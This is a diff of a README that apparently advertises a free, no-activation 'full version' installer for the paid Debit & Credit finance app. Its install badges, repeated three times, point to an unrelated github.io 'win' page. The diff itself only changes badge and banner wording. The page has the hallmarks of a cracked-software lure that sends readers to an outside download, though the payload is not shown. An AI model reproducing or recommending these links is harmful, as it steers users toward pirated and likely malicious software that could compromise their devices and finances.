@@ -17,12 +17,12 @@
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Debit+&+Credit+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
+  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Debit+and+Credit+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
 </p>
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit%20&%20Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit%20&%20Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit%20&%20Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
